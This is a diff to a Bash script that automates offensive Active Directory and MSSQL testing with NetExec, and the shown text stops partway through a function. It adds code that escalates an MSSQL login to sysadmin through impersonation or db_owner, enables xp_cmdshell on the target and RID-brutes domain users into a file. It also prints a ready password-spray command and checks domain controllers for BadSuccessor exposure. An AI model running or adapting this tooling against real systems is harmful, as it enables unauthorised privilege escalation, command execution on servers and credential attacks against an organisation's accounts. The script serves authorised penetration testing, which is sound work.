@@ -151,6 +151,29 @@ ENABLE_KERBROAST=false
 KERBEROS_FOUND=false
 NTLM_ENABLED=false
 NTLM_TIME_SYNC_NOTE_SHOWN=false
+MSSQL_NULL_LOGIN=false
+MSSQL_AUTH_OK=false
+MSSQL_LCLAUTH_OK=false
+MSSQL_INSTANCE_FOUND=false
+MSSQL_PRIVESC=false
+MSSQL_IMPERSONATE=false
+MSSQL_PRIV_CHECKED=false
+MSSQL_IMPERSONATION_FOUND=false
+MSSQL_IMPERSONATION_TARGETS=""
+MSSQL_DBOWNER_PRIVESC_FOUND=false
+MSSQL_PRIVESC_PATH_FOUND=false
+MSSQL_PRIVESC_ATTEMPTED=false
+MSSQL_PRIVESC_OK=false
+MSSQL_SYSADMIN=false
+MSSQL_PRIVESC_MODE=""
+MSSQL_CMDSHELL_CHECKED=false
+MSSQL_CMDSHELL_ENABLE_ATTEMPTED=false
+MSSQL_CMDSHELL_ENABLE_OK=false
+MSSQL_CMDSHELL_ALREADY_ENABLED=false
+MSSQL_CMDSHELL_PERMISSION_DENIED=false
+MSSQL_CMDSHELL_ENABLE_FAILED=false
+MSSQL_CMDSHELL_ERROR=""
+MSSQL_USER=""
 LDAP_FOUND=false
 LDAP_ENUM_DONE=false
 LDAP_ANON_BIND=false
@@ -216,6 +239,23 @@ RBCD_CANDIDATE_FOUND=false
 # or one of AUTH_USER_GROUP_NAMES.
 RBCD_APPLICABLE_ACL=false
 declare -a RBCD_APPLICABLE_TRUSTEES=()
+BADSUCCESSOR_CHECK_DONE=false
+BADSUCCESSOR_DC_2025=false
+DC_VERSION_FOUND=false
+DC_DNS_HOSTNAME=""
+DC_OPERATING_SYSTEM=""
+DC_OPERATING_SYSTEM_VERSION=""
+DC_BUILD_NUMBER=""
+DC_VERSION_EVIDENCE=""
+DC_DISTINGUISHED_NAMES=()
+DC_DNS_HOSTNAMES=()
+DC_OPERATING_SYSTEMS=()
+DC_OPERATING_SYSTEM_VERSIONS=()
+DC_BUILD_NUMBERS=()
+BADSUCCESSOR_CANDIDATES_FOUND=false
+BADSUCCESSOR_APPLICABLE=false
+BADSUCCESSOR_EVIDENCE=""
+declare -a BADSUCCESSOR_APPLICABLE_TRUSTEES=()
 KERBEROAST_HASH_FOUND=false     # Set when Kerberoast output is non-empty
 SPN_NAME=""                     # Parse from Kerberoast result
 BH_ZIP_FILE=""
@@ -327,6 +367,12 @@ for arg in "$@"; do
         *) [ -z "$TARGET" ] && TARGET="$arg" ;;
     esac
 done
+
+# Strip leading whitespace
+AUTH_USER="${AUTH_USER##*([[:space:]])}"
+# Strip trailing whitespace
+AUTH_USER="${AUTH_USER%%*([[:space:]])}"
+
 
 if [ -n "$AUTH_DOMAIN" ] && [ -z "$LDAP_DOMAIN" ]; then
     LDAP_DOMAIN="${AUTH_DOMAIN,,}"
@@ -2281,6 +2327,407 @@ ldap_enum() {
     set -e
 }
 
+check_badsuccessor() {
+  local tool dc_target domain evidence_dir safe_target rc output sanitized_output
+  local candidate_lines candidate_count line principal principal_short principal_lc
+  local auth_user_lc group_name group_short repeatable
+  local applies
+  local -a cmd=()
+  local -a display_cmd=()
+
+  #BADSUCCESSOR_CHECK_DONE=true
+  #BADSUCCESSOR_DC_2025=false
+  #BADSUCCESSOR_CANDIDATES_FOUND=false
+  #BADSUCCESSOR_APPLICABLE=false
+  #BADSUCCESSOR_APPLICABLE_TRUSTEES=()
+
+  dc_target="${TARGET_IPV4:-$TARGET}"
+
+  if [[ "${NTLM_ENABLED:-true}" != true ]]; then
+    dc_target="$(get_preferred_dc_host "$dc_target")"
+  fi
+
+  if [[ -z "${AUTH_USER:-}" || -z "${AUTH_PASS:-}" ]]; then
+    warn "BadSuccessor assessment requires authenticated LDAP credentials"
+    return 1
+  fi
+
+  domain="${AUTH_DOMAIN:-${LDAP_DOMAIN:-}}"
+  if [[ -z "$domain" ]]; then
+    warn "Domain is unknown — skipping BadSuccessor assessment"
+    return 1
+  fi
+
+  if command -v netexec >/dev/null 2>&1; then
+    tool="netexec"
+  elif command -v nxc >/dev/null 2>&1; then
+    tool="nxc"
+  else
+    warn "NetExec was not found — skipping ActiveDirectory/DC versation enum & BadSuccessor assessment"
+    lightbulb "Install or update NetExec, then verify: nxc ldap -L | grep -i badsuccessor"
+    return 1
+  fi
+  
+  # Gather Domain Controller/AD Version
+  ldap_filter='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
+  ldap_attributes='dNSHostName operatingSystem operatingSystemVersion'
+  cmd=(
+    "$tool" ldap "$dc_target"
+    -d "$domain"
+    -u "$AUTH_USER"
+    -p "$AUTH_PASS"
+    --query "$ldap_filter"
+    "$ldap_attributes"
+  )
+
+  display_cmd=(
+    "$tool" ldap "$dc_target"
+    -d "$domain"
+    -u "$AUTH_USER"
+    -p "$AUTH_PASS"
+    --query "$ldap_filter"
+    "$ldap_attributes"
+  )
+
+  if [[ "${NTLM_ENABLED:-true}" != true ]]; then
+    cmd+=( -k )
+    display_cmd+=( -k )
+  fi
+
+  printf -v repeatable '%q ' "${display_cmd[@]}"
+  repeatable="${repeatable% }"
+  
+  evidence_dir="${EVIDENCE_DIR:-.}"
+  mkdir -p "$evidence_dir"
+
+  safe_target="$(sanitize_name "${TARGET_IPV4:-${TARGET:-$domain}}")"
+  DC_VERSION_EVIDENCE="$evidence_dir/dc_version_${safe_target}_$(date +%Y%m%d_%H%M%S).txt"
+  
+  echo
+  info "Obtaining domain controller operating-system versions"
+  echo -e " ${YELLOW}${ICON_TIP:-[*]} Copy/Paste:${RESET}"
+  echo -e " ${GREEN}${repeatable}${RESET}"
+
+  if declare -F record_command >/dev/null 2>&1; then
+    record_command "LDAP" "Domain controller version lookup" "$repeatable"
+  fi
+  
+  [[ $- == *e* ]] && errexit_was_set=true
+  set +e
+
+  output=$("${cmd[@]}" 2>&1)
+  rc=$?
+
+  if [[ "$errexit_was_set" == true ]]; then
+    set -e
+  fi
+
+  # Remove terminal color codes before parsing.
+  clean_output=$(
+    printf '%s\n' "$output" |
+      sed -E $'s/\033\\[[0-9;]*[[:alpha:]]//g'
+  )
+
+  # Redact the password from the successful authentication line.
+  sanitized_output=$(
+    printf '%s\n' "$clean_output" |
+      sed -E \
+        '/^[[:space:]]*LDAP[[:space:]].*\[\+\].*\\/ s/:[^[:space:]]+/:<REDACTED>/'
+  )
+
+  printf '%s\n' "$sanitized_output" |
+    tee "$DC_VERSION_EVIDENCE"
+
+  if (( rc != 0 )); then
+    if declare -F detect_kerberos_clock_skew >/dev/null 2>&1 &&
+       detect_kerberos_clock_skew "$clean_output"; then
+      :
+    elif grep -qiE \
+      'STATUS_LOGON_FAILURE|KDC_ERR|LDAPSessionError|invalid credentials|authentication failed' \
+      <<< "$clean_output"; then
+      warn "LDAP authentication failed during domain controller version lookup"
+    else
+      warn "Domain controller version lookup failed with exit code $rc"
+    fi
+
+    return "$rc"
+  fi
+
+  records=$(
+    printf '%s\n' "$clean_output" |
+      awk '
+        function flush_record() {
+          if (dn != "" || hostname != "" || os != "" || version != "") {
+            print dn "|" hostname "|" os "|" version
+          }
+
+          dn=""
+          hostname=""
+          os=""
+          version=""
+        }
+
+        /Response for object:/ {
+          flush_record()
+
+          dn=$0
+          sub(/^.*Response for object:[[:space:]]*/, "", dn)
+          next
+        }
+
+        {
+          line=$0
+
+          sub(
+            /^[[:space:]]*LDAP[[:space:]]+[^[:space:]]+[[:space:]]+[^[:space:]]+[[:space:]]+[^[:space:]]+[[:space:]]+/,
+            "",
+            line
+          )
+
+          if (line ~ /^operatingSystemVersion[[:space:]]+/) {
+            sub(/^operatingSystemVersion[[:space:]]+/, "", line)
+            version=line
+            next
+          }
+
+          if (line ~ /^operatingSystem[[:space:]]+/) {
+            sub(/^operatingSystem[[:space:]]+/, "", line)
+            os=line
+            next
+          }
+
+          if (line ~ /^dNSHostName[[:space:]]+/) {
+            sub(/^dNSHostName[[:space:]]+/, "", line)
+            hostname=line
+            next
+          }
+        }
+
+        END {
+          flush_record()
+        }
+      '
+  )
+
+  if [[ -z "$records" ]]; then
+    warn "No domain controller operating-system records were returned"
+  else
+    while IFS='|' read -r \
+      dn hostname operating_system operating_system_version; do
+
+      [[ -z "${dn}${hostname}${operating_system}${operating_system_version}" ]] &&
+        continue
+
+      build_number=$(
+        sed -nE 's/.*\(([0-9]+)\).*/\1/p' \
+          <<< "$operating_system_version"
+      )
+
+      DC_DISTINGUISHED_NAMES+=( "$dn" )
+      DC_DNS_HOSTNAMES+=( "$hostname" )
+      DC_OPERATING_SYSTEMS+=( "$operating_system" )
+      DC_OPERATING_SYSTEM_VERSIONS+=( "$operating_system_version" )
+      DC_BUILD_NUMBERS+=( "$build_number" )
+    done <<< "$records"
+
+    if (( ${#DC_DNS_HOSTNAMES[@]} == 0 )); then
+      warn "Unable to parse domain controller version information"
+    else
+      DC_VERSION_FOUND=true
+
+      # Set convenient single-value variables to the first DC returned.
+      DC_DNS_HOSTNAME="${DC_DNS_HOSTNAMES[0]}"
+      DC_OPERATING_SYSTEM="${DC_OPERATING_SYSTEMS[0]}"
+      DC_OPERATING_SYSTEM_VERSION="${DC_OPERATING_SYSTEM_VERSIONS[0]}"
+      DC_BUILD_NUMBER="${DC_BUILD_NUMBERS[0]}"
+
+      success "Found ${#DC_DNS_HOSTNAMES[@]} domain controller object(s)"
+
+      for index in "${!DC_DNS_HOSTNAMES[@]}"; do
+        echo
+        echo -e "  ${CYAN}Domain Controller:${RESET} ${DC_DNS_HOSTNAMES[$index]:-Unknown}"
+        echo -e "  ${CYAN}Operating System:${RESET}  ${DC_OPERATING_SYSTEMS[$index]:-Unknown}"
+        echo -e "  ${CYAN}Version:${RESET}           ${DC_OPERATING_SYSTEM_VERSIONS[$index]:-Unknown}"
+
+        if [[ -n "${DC_BUILD_NUMBERS[$index]}" ]]; then
+          echo -e "  ${CYAN}Build:${RESET}             ${DC_BUILD_NUMBERS[$index]}"
+        fi
+      done
+
+      success "Domain controller version evidence saved to: ${BYELLOW}${DC_VERSION_EVIDENCE}${RESET}"
+    fi
+  fi
+
+  ## Start BadSuccessor Assessment
+  evidence_dir="${EVIDENCE_DIR:-.}"
+  mkdir -p "$evidence_dir"
+
+  safe_target="$(sanitize_name "${TARGET_IPV4:-$TARGET}")"
+  BADSUCCESSOR_EVIDENCE="$evidence_dir/badsuccessor_${safe_target}_$(date +%Y%m%d_%H%M%S).txt"
+
+  cmd=(
+    "$tool" ldap "$dc_target"
+    -u "$AUTH_USER"
+    -p "$AUTH_PASS"
+    -d "$domain"
+    -M badsuccessor
+  )
+
+  display_cmd=(
+    "$tool" ldap "$dc_target"
+    -u "$AUTH_USER"
+    -p "$AUTH_PASS"
+    -d "$domain"
+    -M badsuccessor
+  )
+
+  if [[ "${NTLM_ENABLED:-true}" != true ]]; then
+    cmd+=( -k )
+    display_cmd+=( -k )
+  fi
+
+  printf -v repeatable '%q ' "${display_cmd[@]}"
+  repeatable="${repeatable% }"
+  
+  echo
+  info "Checking BadSuccessor/dMSA OU-permission exposure via NetExec"
+  echo -e " ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+  echo -e " ${GREEN}${repeatable}${RESET}"
+
+  record_command "LDAP" "BadSuccessor exposure check" "$repeatable"
+
+  set +e
+  output=$("${cmd[@]}" 2>&1)
+  rc=$?
+  set -e
+
+  sanitized_output=$(
+    printf '%s\n' "$output" |
+      sed -E '/^[[:space:]]*LDAP[[:space:]].*\[\+\]/ s/:[^[:space:]]+/:<REDACTED>/'
+  )
+
+  printf '%s\n' "$sanitized_output" | tee "$BADSUCCESSOR_EVIDENCE"
+
+  if grep -qiE \
+    'module.*(not found|does not exist)|invalid.*module|unknown module' \
+    <<< "$output"; then
+    warn "This NetExec build does not include the badsuccessor LDAP module"
+    lightbulb "Update NetExec and verify with: $tool ldap -L | grep -i badsuccessor"
+    return 1
+  fi
+
+  if (( rc != 0 )); then
+    if detect_kerberos_clock_skew "$output"; then
+      :
+    elif grep -qiE \
+      'STATUS_LOGON_FAILURE|KDC_ERR|LDAPSessionError|invalid credentials|authentication failed' \
+      <<< "$output"; then
+      warn "BadSuccessor assessment failed during LDAP authentication"
+    else
+      warn "BadSuccessor assessment failed with exit code $rc"
+    fi
+
+    return "$rc"
+  fi
+
+  if grep -q \
+    'Found domain controller with operating system Windows Server 2025' \
+    <<< "$output"; then
+    BADSUCCESSOR_DC_2025=true
+    success "A Windows Server 2025 domain controller was reported"
+  else
+    notify "NetExec did not report a Windows Server 2025 domain controller"
+  fi
+
+  candidate_lines=$(
+    printf '%s\n' "$output" |
+      awk '
+        /^[[:space:]]*BADSUCCE/ &&
+        $0 !~ /\[[+-]\]/ &&
+        $0 !~ /Found domain controller|No domain controller|Found [0-9]+ results|No account found/ {
+          line=$0
+
+          sub(/^[^[:space:]]+[[:space:]]+/, "", line)
+          sub(/^[^[:space:]]+[[:space:]]+/, "", line)
+          sub(/^[^[:space:]]+[[:space:]]+/, "", line)
+          sub(/^[^[:space:]]+[[:space:]]+/, "", line)
+
+          if (line != "") {
+            print line
+          }
+        }
+      '
+  )
+
+  candidate_count=0
+
+  if [[ -n "$candidate_lines" ]]; then
+    candidate_count=$(grep -c . <<< "$candidate_lines")
+    BADSUCCESSOR_CANDIDATES_FOUND=true
+
+    if (( candidate_count == 1 )); then
+      high_risk "NetExec reported 1 BadSuccessor-relevant principal/OU permission entry"
+    else
+      high_risk "NetExec reported $candidate_count BadSuccessor-relevant principal/OU permission entries"
+    fi
+
+    printf '%s\n' "$candidate_lines" | sed 's/^/  - /'
+  else
+    success "No BadSuccessor-relevant OU permission candidates were reported"
+  fi
+
+  auth_user_lc="${AUTH_USER##*\\}"
+  auth_user_lc="${auth_user_lc,,}"
+
+  if [[ "$BADSUCCESSOR_CANDIDATES_FOUND" == true ]]; then
+    while IFS= read -r line; do
+      [[ -z "$line" ]] && continue
+
+      principal="${line%% (*}"
+      principal_short="${principal##*\\}"
+      principal_lc="${principal_short,,}"
+      applies=false
+
+      if [[ -n "$auth_user_lc" && "$principal_lc" == "$auth_user_lc" ]]; then
+        applies=true
+      fi
+
+      case "$principal_lc" in
+        "authenticated users"|"everyone"|"domain users")
+          applies=true
+          ;;
+      esac
+
+      if [[ "$applies" != true ]]; then
+        for group_name in "${AUTH_USER_GROUP_NAMES[@]:-}"; do
+          group_short="${group_name##*\\}"
+
+          if [[ "${group_short,,}" == "$principal_lc" ]]; then
+            applies=true
+            break
+          fi
+        done
+      fi
+
+      if [[ "$applies" == true ]]; then
+        BADSUCCESSOR_APPLICABLE=true
+        BADSUCCESSOR_APPLICABLE_TRUSTEES+=( "$line" )
+      fi
+    done <<< "$candidate_lines"
+  fi
+
+  if [[ "$BADSUCCESSOR_DC_2025" == true && "$BADSUCCESSOR_APPLICABLE" == true ]]; then
+    high_risk "The authenticated user/group context matches a reported writable OU candidate"
+    note "Treat this as a privilege-escalation exposure candidate requiring manual validation"
+  elif [[ "$BADSUCCESSOR_CANDIDATES_FOUND" == true ]]; then
+    notify "OU permission candidates exist, but none matched the current user or enumerated group names"
+  fi
+
+  success "BadSuccessor evidence saved to: ${BYELLOW}$BADSUCCESSOR_EVIDENCE${RESET}"
+  note "This check does not verify patch state, KDS root-key availability, deny ACEs, or effective access"
+
+  return 0
+}
 
 kerberos_auth_check() {
     command -v kinit >/dev/null 2>&1 || {
@@ -3517,6 +3964,558 @@ print_cve_hint() {
     fi
 }
 
+# Optional RID-brute status flags
+MSSQL_RIDBRUTE_OK=false
+MSSQL_RIDBRUTE_LCLAUTH_OK=false
+
+run_mssql_priv_detection() {
+    local auth_mode="$1"
+    local auth_label
+    local priv_output clean_output targets
+    local priv_rc=0
+    local priv_command="netexec"
+    local rollback_command="netexec"
+    local quoted arg
+
+    local -a base_args=(
+        mssql
+        "$TARGET_IPV4"
+        -u "$AUTH_USER"
+        -p "$AUTH_PASS"
+    )
+
+    case "$auth_mode" in
+        default)
+            auth_label="standard authentication"
+            ;;
+
+        local)
+            auth_label="local authentication"
+            base_args+=(--local-auth)
+            ;;
+
+        *)
+            warn "Unknown MSSQL authentication mode: $auth_mode"
+            return 2
+            ;;
+    esac
+
+    local -a priv_args=(
+        "${base_args[@]}"
+        -M mssql_priv
+        -o ACTION=privesc
+    )
+
+    # Generate a shell-safe copy/paste command.
+    for arg in "${priv_args[@]}"; do
+        printf -v quoted '%q' "$arg"
+        priv_command+=" $quoted"
+    done
+
+    lightbulb \
+        "Checking MSSQL impersonation and privilege-escalation paths:"
+
+    printf '        %b%s%b\n' \
+        "$GREEN" "$priv_command" "$RESET"
+
+    record_command \
+        "MSSQL" \
+        "Privilege Escalation - Impersonation/db_owner" \
+        "$priv_command"
+
+    MSSQL_PRIVESC_ATTEMPTED=true
+    MSSQL_PRIVESC_MODE="$auth_mode"
+
+    # Preserve output and exit status without triggering set -e.
+    if priv_output="$(netexec "${priv_args[@]}" 2>&1)"; then
+        priv_rc=0
+    else
+        priv_rc=$?
+    fi
+
+    # Remove ANSI color codes before parsing.
+    clean_output="$(
+        sed $'s/\033\\[[0-9;]*m//g' <<< "$priv_output"
+    )"
+
+    # Display only module findings. This avoids printing the authentication
+    # line containing the password a second time.
+    grep -E \
+        '^[[:space:]]*MSSQL_PRIV[[:space:]]+' \
+        <<< "$clean_output" || true
+
+    # Confirm that authentication succeeded during this invocation.
+    if ! grep -Eq \
+        '^[[:space:]]*MSSQL[[:space:]].*\[\+\]' \
+        <<< "$clean_output"; then
+
+        warn "MSSQL ${auth_label} failed during mssql_priv"
+
+        if [[ "$priv_rc" -ne 0 ]]; then
+            note "NetExec exited with status $priv_rc"
+        fi
+
+        return 1
+    fi
+
+    MSSQL_PRIV_CHECKED=true
+
+    # Extract everything after "can impersonate:".
+    #
+    # Examples handled:
+    #   kevin can impersonate: appdev
+    #   DOMAIN\kevin can impersonate: sa (sysadmin)
+    #   login can impersonate: other login (which can privesc via dbowner)
+    #
+    # No domain, hostname, source username, or target username is hard-coded.
+    targets="$(
+        awk '
+            /can impersonate:/ {
+                value = $0
+
+                sub(/^.*can impersonate:[[:space:]]*/, "", value)
+                sub(/[[:space:]]+\(sysadmin\).*$/, "", value)
+                sub(/[[:space:]]+\(which can privesc via dbowner\).*$/, "", value)
+
+                sub(/^[[:space:]]+/, "", value)
+                sub(/[[:space:]]+$/, "", value)
+
+                if (value != "" && !seen[value]++)
+                    print value
+            }
+        ' <<< "$clean_output"
+    )"
+
+    if [[ -n "$targets" ]]; then
+        MSSQL_IMPERSONATION_FOUND=true
+        MSSQL_IMPERSONATION_TARGETS="$targets"
+
+        critical "MSSQL login can impersonate SQL principals:"
+    
+        while IFS= read -r target; do
+            [[ -n "$target" ]] || continue
+
+            printf '      - %b%s%b\n' \
+                "$BYELLOW" "$target" "$RESET"
+        done <<< "$targets"
+    fi
+
+    if grep -Eqi \
+        'can impersonate:.*\(sysadmin\)|can privesc via dbowner|which can privesc via dbowner' \
+        <<< "$clean_output"; then
+
+        MSSQL_PRIVESC_PATH_FOUND=true
+        critical "MSSQL privilege-escalation path to sysadmin identified"
+    fi
+
+    if grep -Eqi 'privesc via dbowner' <<< "$clean_output"; then
+        MSSQL_DBOWNER_PRIVESC_FOUND=true
+        critical "MSSQL db_owner/TRUSTWORTHY escalation path found"
+    fi
+
+    if grep -Eqi 'is already a sysadmin' <<< "$clean_output"; then
+        MSSQL_SYSADMIN=true
+        critical "MSSQL login is already a sysadmin"
+    fi
+
+    if grep -Eqi 'is now a sysadmin' <<< "$clean_output"; then
+        MSSQL_PRIVESC_OK=true
+        MSSQL_SYSADMIN=true
+        critical "MSSQL privilege escalation succeeded"
+    fi
+
+    if grep -Eqi \
+        "can't find any path to privesc|cannot find any path to privesc" \
+        <<< "$clean_output"; then
+
+        if [[ "$MSSQL_IMPERSONATION_FOUND" == true ]]; then
+            warn \
+                "MSSQL impersonation found, but NetExec found no direct path to sysadmin"
+        else
+            notify "No MSSQL privilege-escalation path was found"
+        fi
+    fi
+
+    if [[ "$priv_rc" -ne 0 ]]; then
+        note "NetExec exited with status $priv_rc"
+    fi
+
+    return 0
+}
+
+run_mssql_rid_brute() {
+    local auth_mode="$1"
+    local auth_label
+    local rid_output rid_rows
+    local rid domain principal
+    local detected_domain=""
+    local date_tag users_file spray_command
+    local display_command="netexec"
+    local arg quoted
+
+    local -a nxc_args=(
+        mssql
+        "$TARGET_IPV4"
+        -u "$AUTH_USER"
+        -p "$AUTH_PASS"
+    )
+
+    local -a users=()
+    local -A seen_users=()
+    local -A seen_domains=()
+
+    case "$auth_mode" in
+        default)
+            auth_label="standard authentication"
+            ;;
+        local)
+            auth_label="local authentication"
+            nxc_args+=(--local-auth)
+            ;;
+        *)
+            warn "Unknown MSSQL authentication mode: $auth_mode"
+            return 2
+            ;;
+    esac
+
+    nxc_args+=(--rid-brute)
+
+    # Generate a shell-safe copy/paste command.
+    for arg in "${nxc_args[@]}"; do
+        printf -v quoted '%q' "$arg"
+        display_command+=" $quoted"
+    done
+
+    lightbulb "Running MSSQL RID brute using ${auth_label}:"
+    printf '        %b%s%b\n' "$GREEN" "$display_command" "$RESET"
+
+    # Preserve output even if NetExec returns a nonzero status.
+    if ! rid_output="$(netexec "${nxc_args[@]}" 2>&1)"; then
+        :
+    fi
+
+    # NetExec marks successful authentication with [+].
+    if ! grep -Eq \
+        '^[[:space:]]*MSSQL[[:space:]].*\[\+\]' \
+        <<< "$rid_output"; then
+
+        warn "MSSQL ${auth_label} failed; RID brute was not authenticated"
+
+        # Show useful NetExec errors without exposing all normal output.
+        grep -E '\[-\]|\[!\]|ERROR|Error|error' \
+            <<< "$rid_output" >&2 || true
+
+        return 1
+    fi
+
+    notify "MSSQL ${auth_label} succeeded"
+
+    # Parse lines in this format:
+    #
+    #   1606: ANY-DOMAIN\jamie.dunn
+    #
+    # No domain name is hard-coded.
+    rid_rows="$(
+        awk '
+            /^[[:space:]]*MSSQL[[:space:]]/ {
+                line = $0
+
+                # Locate a RID field such as:
+                #   1606:
+                if (!match(line, /[[:space:]][0-9]+:[[:space:]]+/))
+                    next
+
+                rid = substr(line, RSTART, RLENGTH)
+                gsub(/[^0-9]/, "", rid)
+
+                # Everything after the RID should be DOMAIN\principal.
+                qualified_name = substr(line, RSTART + RLENGTH)
+
+                slash = index(qualified_name, "\\")
+                if (!slash)
+                    next
+
+                domain = substr(qualified_name, 1, slash - 1)
+                name = substr(qualified_name, slash + 1)
+
+                sub(/^[[:space:]]+/, "", domain)
+                sub(/[[:space:]]+$/, "", domain)
+                sub(/^[[:space:]]+/, "", name)
+                sub(/[[:space:]]+$/, "", name)
+    
+                if (domain != "" && name != "")
+                    printf "%s\t%s\t%s\n", rid, domain, name
+            }
+        ' <<< "$rid_output"
+    )"
+
+    if [[ -z "$rid_rows" ]]; then
+        warn "RID brute authenticated, but no RID entries were parsed"
+        return 1
+    fi
+
+    # NetExec's MSSQL RID output does not include SidTypeUser or
+    # SidTypeGroup. Build a list of likely users by excluding:
+    #
+    #   - machine accounts ending with $
+    #   - well-known domain group RIDs
+    #
+    # Custom domain groups can still appear in the resulting list.
+    while IFS=$'\t' read -r rid domain principal; do
+        [[ -n "$principal" ]] || continue
+
+        # Exclude computer and managed machine-style accounts.
+        [[ "$principal" == *'$' ]] && continue
+
+        # Exclude well-known domain group RIDs.
+        case "$rid" in
+            498|512|513|514|515|516|517|518|519|520|521|522|525|526|527|528|529|553|571|572)
+                continue
+                ;;
+        esac
+
+        seen_domains["$domain"]=1
+
+        if [[ -z "${seen_users[$principal]+x}" ]]; then
+            seen_users["$principal"]=1
+            users+=("$principal")
+        fi
+    done <<< "$rid_rows"
+
+    if ((${#users[@]} == 0)); then
+        notify "RID brute succeeded, but no likely users remained after filtering"
+        return 0
+    fi
+
+    # Select the domain dynamically when exactly one domain was found.
+    if ((${#seen_domains[@]} == 1)); then
+        for domain in "${!seen_domains[@]}"; do
+            detected_domain="$domain"
+        done
+
+        notify "Discovered domain: ${BYELLOW}${detected_domain}${RESET}"
+    else
+        warn "RID results contained multiple domains; spray command will omit -d"
+    fi
+
+    date_tag="$(date +'%Y%m%d_%H%M%S')"
+
+    users_file="$(
+        printf 'users_%s_%s_%s.txt' \
+            "${TARGET_IPV4//:/_}" \
+            "$auth_mode" \
+            "$date_tag"
+    )"
+
+    printf '%s\n' "${users[@]}" |
+        sort -fu > "$users_file"
+
+    notify "Discovered likely users via MSSQL RID brute:"
+
+    while IFS= read -r principal; do
+        printf '      - %b%s%b\n' \
+            "$BYELLOW" "$principal" "$RESET"
+    done < "$users_file"
+
+    note "User candidate list saved to: ${GREEN}${users_file}${RESET}"
+
+    note "NetExec did not return SID object types; validate custom groups with LDAP before spraying."
+
+    lightbulb "Maybe try a password spray if you know an approved default password:"
+
+    lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
+
+    # Build the spray command using the dynamically discovered domain.
+    if [[ -n "$detected_domain" ]]; then
+        printf -v spray_command \
+            'netexec smb %q -u %q -p %q -d %q --continue-on-success' \
+            "$TARGET_IPV4" "$users_file" '<ADefaultPassword>' "$detected_domain"
+    else
+        printf -v spray_command \
+            'netexec smb %q -u %q -p %q --continue-on-success' \
+            "$TARGET_IPV4" "$users_file" '<ADefaultPassword>'
+    fi
+
+    printf '        %b%s%b\n' \
+        "$GREEN" "$spray_command" "$RESET"
+
+    record_command "SMB" "Auth Discovery - Password Spray" "$spray_command"
+
+    printf '%s\n' "KERBEROS" "LDAP" >> "$HINT_FILE"
+
+    case "$auth_mode" in
+        default)
+            MSSQL_RIDBRUTE_OK=true
+            ;;
+        local)
+            MSSQL_RIDBRUTE_LCLAUTH_OK=true
+            ;;
+    esac
+}
+
+run_mssql_cmdshell_check() {
+    local auth_mode="$1"
+    local auth_label
+    local cmdshell_output clean_output
+    local cmdshell_rc=0
+    local cmdshell_command="netexec"
+    local quoted arg
+
+    local -a cmdshell_args=(
+        mssql
+        "$TARGET_IPV4"
+        -u "$AUTH_USER"
+        -p "$AUTH_PASS"
+    )
+
+    case "$auth_mode" in
+        default)
+            auth_label="default/domain authentication"
+            ;;
+
+        local)
+            auth_label="local authentication"
+            cmdshell_args+=(--local-auth)
+            ;;
+
+        *)
+            warn "Unknown MSSQL authentication mode: $auth_mode"
+            return 2
+            ;;
+    esac
+
+    cmdshell_args+=(
+        -M enable_cmdshell
+        -o ACTION=enable
+    )
+
+    for arg in "${cmdshell_args[@]}"; do
+        printf -v quoted '%q' "$arg"
+        cmdshell_command+=" $quoted"
+    done
+
+    lightbulb "Checking whether xp_cmdshell can be enabled:"
+    printf '        %b%s%b\n' \
+        "$GREEN" "$cmdshell_command" "$RESET"
+
+    record_command \
+        "MSSQL" \
+        "Privilege Escalation - Enable xp_cmdshell" \
+        "$cmdshell_command"
+
+    MSSQL_CMDSHELL_ENABLE_ATTEMPTED=true
+
+    if cmdshell_output="$(netexec "${cmdshell_args[@]}" 2>&1)"; then
+        cmdshell_rc=0
+    else
+        cmdshell_rc=$?
+    fi
+
+    # Remove ANSI escape sequences before parsing.
+    clean_output="$(
+        sed $'s/\033\\[[0-9;]*m//g' <<< "$cmdshell_output"
+    )"
+
+    # Display only the module result, not the authentication line that
+    # contains the supplied password.
+    grep -Ei \
+        'xp_cmdshell|RECONFIGURE|ENABLE_CMD|ENABLE_C' \
+        <<< "$clean_output" || true
+
+    # Ensure this particular invocation authenticated successfully.
+    if ! grep -Eq \
+        '^[[:space:]]*MSSQL[[:space:]].*\[\+\]' \
+        <<< "$clean_output"; then
+
+        warn \
+            "MSSQL ${auth_label} failed during the xp_cmdshell check"
+
+        [[ "$cmdshell_rc" -ne 0 ]] &&
+            note "NetExec exited with status $cmdshell_rc"
+
+        return 1
+    fi
+
+    MSSQL_CMDSHELL_CHECKED=true
+
+    # Handle permission errors before checking generic success strings.
+    if grep -Eqi \
+        'You do not have permission to run the RECONFIGURE statement|permission denied.*RECONFIGURE|Failed to enable xp_cmdshell:.*permission' \
+        <<< "$clean_output"; then
+
+        MSSQL_CMDSHELL_PERMISSION_DENIED=true
+        MSSQL_CMDSHELL_ENABLE_FAILED=true
+
+        MSSQL_CMDSHELL_ERROR="$(
+            sed -n \
+                's/^.*Failed to enable xp_cmdshell:[[:space:]]*//p' \
+                <<< "$clean_output" |
+                head -n 1
+        )"
+
+        warn \
+            "xp_cmdshell could not be enabled: the SQL login cannot run RECONFIGURE"
+
+        note \
+            "Valid MSSQL authentication does not imply CONTROL SERVER or sysadmin privileges"
+
+        return 0
+    fi
+
+    if grep -Eqi \
+        'xp_cmdshell.*already enabled|xp_cmdshell is enabled already' \
+        <<< "$clean_output"; then
+
+        MSSQL_CMDSHELL_ALREADY_ENABLED=true
+        MSSQL_CMDSHELL_ENABLE_OK=true
+
+        critical "xp_cmdshell was already enabled"
+        return 0
+    fi
+
+    if grep -Eqi \
+        '\[\+\].*(successfully enabled xp_cmdshell|xp_cmdshell.*enabled)|successfully enabled xp_cmdshell' \
+        <<< "$clean_output"; then
+
+        MSSQL_CMDSHELL_ENABLE_OK=true
+
+        critical \
+            "xp_cmdshell was successfully enabled using ${auth_label}"
+
+        return 0
+    fi
+
+    if grep -Eqi \
+        'Failed to enable xp_cmdshell|could not enable xp_cmdshell|unable to enable xp_cmdshell' \
+        <<< "$clean_output"; then
+
+        MSSQL_CMDSHELL_ENABLE_FAILED=true
+
+        MSSQL_CMDSHELL_ERROR="$(
+            sed -n \
+                's/^.*Failed to enable xp_cmdshell:[[:space:]]*//p' \
+                <<< "$clean_output" |
+                head -n 1
+        )"
+
+        warn "Failed to enable xp_cmdshell"
+
+        if [[ -n "$MSSQL_CMDSHELL_ERROR" ]]; then
+            note "Reason: $MSSQL_CMDSHELL_ERROR"
+        fi
+
+        return 0
+    fi
+
